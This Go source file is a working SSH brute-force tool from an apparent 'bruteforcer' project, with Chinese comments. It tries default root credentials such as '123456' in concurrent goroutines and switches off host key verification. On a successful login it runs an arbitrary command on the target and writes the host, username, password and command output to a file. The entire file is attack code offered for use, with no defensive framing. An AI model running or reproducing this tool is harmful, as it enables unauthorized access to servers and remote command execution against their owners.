package brute

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"net"
	"os"
	"strings"
	"time"
)
import "bruteforcer/Global"

var TotalGo = 0
var SucGo = 0
var sshBruteUsers = []string{"root"}
var sshBrutePwds = []string{
	"123456",
	"root",
}
var Timeout = 5 * time.Second

func SSHBrute(host string, port string, file *os.File) {
	TotalGo++
	if Global.USR != "" {
		sshBruteUsers = nil
		sshBruteUsers = append(sshBruteUsers, Global.USR)
	}
	if Global.PWD != "" {
		sshBrutePwds = nil
		sshBrutePwds = append(sshBrutePwds, Global.PWD)
	}
	isSuc := false
	if Global.DBG {
		fmt.Printf("%v开始执行\n", host+":"+port)
	}
	for _, user := range sshBruteUsers {
		for _, pwd := range sshBrutePwds {
			//go doSingleSSHBrute(host, port, user, pwd, &isSuc, file)
			go doSingleSSHBrute(host, port, user, pwd, &isSuc, file)
			time.Sleep(time.Duration(500 * time.Microsecond))

		}
	}
}
func doSingleSSHBrute(host string, port string, user string, pwd string, isSuc *bool, file *os.File) {
	defer func() {
		if r := recover(); r != nil {
			if Global.DBG {
				fmt.Println("recover value is", r)
				fmt.Printf("ERROR INFO host:%v", host)
			}
		}
	}() //处理异常
	retryN := 0
restart:
	retryN++
	sshConf := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pwd),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
		Timeout: time.Duration(Timeout), // ssh连接超时5s
	}
	sshdial, err := ssh.Dial("tcp", host+":"+port, sshConf)
	if err == nil { //如果密码正确

		defer func(sshdial *ssh.Client) { // 关闭ssh通道
			err := sshdial.Close()
			if err != nil && Global.DBG {
				println("ssh通道关闭错误")
			}
		}(sshdial)
		//密码正确
		session, sessionerr := sshdial.NewSession()
		if sessionerr == nil {
			defer func(session *ssh.Session) { // 关闭session
				err := session.Close()
				if err != nil && Global.DBG {
					println("session关闭错误")
				}
			}(session)

			shellOutput, runerr := session.CombinedOutput(Global.CMD)
			if runerr == nil {
				if *isSuc {
					return
				}
				if Global.DBG {
					println("成功")
				}
				sucOutStr := fmt.Sprintf("%v:%v-%v:%v=%v->%v", host, port, user, pwd, Global.CMD, string(shellOutput))
				sucOutStr = strings.ReplaceAll(sucOutStr, "\n", "")
				fmt.Printf("%v(%v/%v)\n", sucOutStr, SucGo, TotalGo) // 输出成功信息
				_, _ = file.WriteString(sucOutStr + "\n")            // 打印信息
				*isSuc = true
				SucGo++
			} else if Global.DBG {
				println(fmt.Sprintf("命令运行错误 %v", runerr))
			}
		} else {
			if Global.DBG {
				println("session创建错误")
			}
		}

	} else {
		if (strings.Contains(err.Error(), "EOF") || strings.Contains(err.Error(), "forcibly closed") || strings.Contains(err.Error(), "too many") || strings.Contains(err.Error(), "reset by peer")) && retryN <= 3 {
			goto restart // 如果不是验证错误的重试3次
		}
		if Global.DBG {
			OutStr := fmt.Sprintf("%v:%v-%v:%v", host, port, user, pwd)
			println("err" + OutStr)
			println(err.Error())
			//return
		}
	}
}
